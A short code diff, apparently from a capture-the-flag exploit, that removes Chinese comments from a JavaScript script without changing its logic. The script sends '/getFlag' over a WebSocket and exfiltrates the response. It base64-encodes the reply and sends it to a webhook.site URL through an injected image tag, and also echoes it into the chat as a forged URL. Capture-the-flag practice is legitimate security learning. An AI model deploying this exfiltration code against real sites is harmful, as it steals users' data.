@@ -9,17 +9,15 @@
   function exfiltrate(msg) {
     const encoded = btoa(msg);
 
-    // 方法一：Webhook 傳出
     const i = document.createElement("img");
     i.src = "https://webhook.site/36d1845d-ac17-42f9-bfe5-727cd6aad3f2?data=" + encoded;
     document.body.appendChild(i);
 
-    // 方法二：偽造 URL，回傳給聊天室
     ws.send(JSON.stringify({ message: "http://flag." + msg.replace(/\s+/g, '') }));
   }
 
   ws.onopen = () => {
-    // 延遲 1 秒後發送
+
     setTimeout(() => {
       ws.send(JSON.stringify({ message: "/getFlag" }));
     }, 1000);
@@ -29,7 +27,7 @@
     try {
       const msg = JSON.parse(e.data).message;
 
-      // 若不是權限錯誤就嘗試 exfiltrate
+
       if (!msg.includes("not authorized")) {
         exfiltrate(msg);
       } else if (retries < 3) {
